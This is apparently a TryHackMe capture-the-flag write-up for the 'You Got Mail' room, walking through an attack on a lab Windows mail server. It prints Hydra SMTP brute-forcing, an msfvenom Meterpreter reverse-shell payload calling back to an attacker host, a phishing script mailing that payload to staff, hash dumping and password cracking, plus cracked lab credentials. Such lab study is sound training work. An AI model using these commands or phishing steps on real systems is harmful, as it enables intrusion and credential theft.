# You Got Mail — TryHackMe Writeup

Platform: TryHackMe  
Room: You Got Mail  
Target IP: 10.112.179.250  
Domain: brownbrick.co  
Machine Name: BRICK-MAIL  
OS: Windows Server 2019  

---

# 🧠 Overview

This room focuses on:

- SMTP enumeration
- Username harvesting
- Password spraying
- Phishing attack simulation
- Meterpreter access
- Windows hash dumping
- Offline password cracking
- hMailServer credential extraction

The attack path:

Recon → SMTP brute force → Phishing → Reverse shell → Hashdump → Crack passwords → Administrator compromise

---

# 🔎 Enumeration

## Port Scanning

Used Rustscan:

```bash
rustscan -a 10.112.179.250
Open Ports
Port	Service
25	SMTP (hMailServer)
110	POP3
143	IMAP
445	SMB
587	SMTP
3389	RDP
5985	WinRM
135+	MSRPC

Target hostname:

BRICK-MAIL

Mail server:

hMailServer
🌐 Passive Recon

Scope allowed passive recon on:

https://brownbrick.co

Installed CeWL to generate custom wordlist:

git clone https://github.com/digininja/CeWL/
bundle install
./cewl.rb https://brownbrick.co --lowercase > custom_password.txt
👥 Username Enumeration

Extracted employee names from website:

oaurelius@brownbrick.co

wrohit@brownbrick.co

lhedvig@brownbrick.co

tchikondi@brownbrick.co

pcathrine@brownbrick.co

fstamatis@brownbrick.co

Saved into:

users.txt
🔐 SMTP Password Brute Force

Used Hydra:

hydra -L users.txt -P custom_password.txt mail.thm smtp -V -I

✅ Found credentials:

lhedvig@brownbrick.co : bricks
🎣 Phishing Attack

Goal: Send malicious attachment to all users.

1️⃣ Generate Payload

Using Metasploit:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.113.83.36 LPORT=1337 -f exe > update.exe
2️⃣ Python Email Script

Used SMTP login to send malicious attachment:

smtp_server = "10.113.173.120"
smtp_port = 587
sender_email = "lhedvig@brownbrick.co"
sender_password = "bricks"
attachment_path = "update.exe"

Script sends email with update.exe to all employees.

💣 Reverse Shell

Started Metasploit listener:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.113.83.36
set LPORT 1337
run

🎯 Got Meterpreter session:

Meterpreter session 1 opened

Upgraded to shell:

meterpreter > shell
🔓 Dumping Windows Password Hashes

Used:

meterpreter > hashdump

Extracted NTLM hashes including:

wrohit:8458995f1d0a4b0c107fb8e23362c814
🧩 Cracking User Password

Saved hash into wrohit.txt

Used John:

john wrohit.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

✅ Cracked password:

wrohit : superstar
🗂️ hMailServer Administrator Password

While browsing:

C:\Program Files (x86)\hMailServer\

Found hashed Administrator password.

Cracked using Hashcat:

hashcat hash3.txt /usr/share/wordlists/rockyou.txt

Successfully recovered hMailServer admin credentials.

🖥️ System Information

Windows Server 2019

hMailServer running

SMB signing enabled but not required

RDP available

WinRM available

📌 Key Takeaways

Always perform passive recon for username harvesting.

Custom wordlists dramatically improve brute-force success.

SMTP login brute forcing can expose internal users.

Phishing is often the easiest initial access vector.

Once on Windows, hashdump + offline cracking is extremely powerful.

hMailServer stores credentials locally — check Program Files.

🛠️ Tools Used

Rustscan

Hydra

CeWL

Metasploit

msfvenom

John the Ripper

Hashcat

🔥 Attack Chain Summary

Enumerated SMTP service

Generated password list from website

Brute forced SMTP login

Sent phishing email with reverse shell

Got Meterpreter access

Dumped Windows hashes

Cracked user password

Extracted hMailServer admin credentials

🎯 Final Outcome

✔ Initial Access via Phishing
✔ Lateral Movement via Password Cracking
✔ Mail Server Administrator Access
